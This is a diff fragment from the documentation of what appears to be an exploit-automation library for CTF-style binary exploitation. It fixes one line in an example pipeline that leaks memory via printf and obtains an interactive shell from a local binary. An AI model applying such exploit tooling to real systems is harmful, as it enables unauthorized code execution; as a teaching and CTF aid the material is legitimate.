@@ -84,7 +84,7 @@ See how the below example neatly manages to "downgrade" the problem from somethi
     s = PwnState(BIN, lambda: process(BIN))
 
     # build a custom pipeline - base classic pipeline, with printf for leaking
-    pipeline = Pipeline(set_overwriter, turnkey.classic(leak=leak.printf))
+    pipeline = Pipeline(set_overwriter, turnkey.classic(leak=leak.printf()))
     result = pipeline(s)
 
     # switch to interactive shell which we got via the exploit
